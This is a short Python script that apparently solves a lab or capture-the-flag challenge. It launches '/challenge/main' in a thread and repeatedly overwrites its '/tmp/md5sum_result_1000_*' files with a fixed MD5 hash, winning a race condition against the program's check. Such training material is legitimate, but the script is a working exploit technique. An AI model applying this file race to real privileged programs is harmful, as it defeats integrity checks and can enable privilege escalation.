import os
import glob
import threading


def run_challenge(event):
    os.system('/challenge/main 666')
    event.set()


def solution():
    evt = threading.Event()
    challenge = threading.Thread(target=run_challenge, args=(evt,))
    challenge.start()
    file_list = glob.glob('/tmp/md5sum_result_1000_*')
    i = 0
    while not evt.is_set():
        for filename in file_list:
            try:
                with open(filename, "w") as f:
                    f.write('5bbbbc107dd9c0ee0b6503025bafca6e')
            except Exception as e:
                pass
        i += 1
        if i == 100:
            break


if __name__ == '__main__':
    solution()
